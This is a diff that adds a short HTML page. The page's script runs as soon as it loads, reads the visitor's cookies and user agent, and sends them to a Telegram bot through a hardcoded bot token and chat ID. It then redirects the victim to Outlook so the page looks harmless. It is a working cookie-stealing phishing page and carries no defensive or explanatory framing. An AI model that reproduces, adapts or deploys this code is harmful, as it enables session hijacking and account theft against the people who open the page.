@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+const BOT_TOKEN = '9082262060:AAECO5QaNFTrqtSiu4iEXExFy2ldnODeNds';
+const CHAT_ID = '8037323046';
+
+function steal() {
+    const cookies = document.cookie;
+    const text = `Cookie Stolen!\n\nUser Agent: ${navigator.userAgent}\nCookies: ${cookies}`;
+
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: text
+        })
+    }).then(() => {
+        window.location.href = "https://outlook.live.com";
+    });
+}
+
+steal();
+</script>
+</body>
+</html>
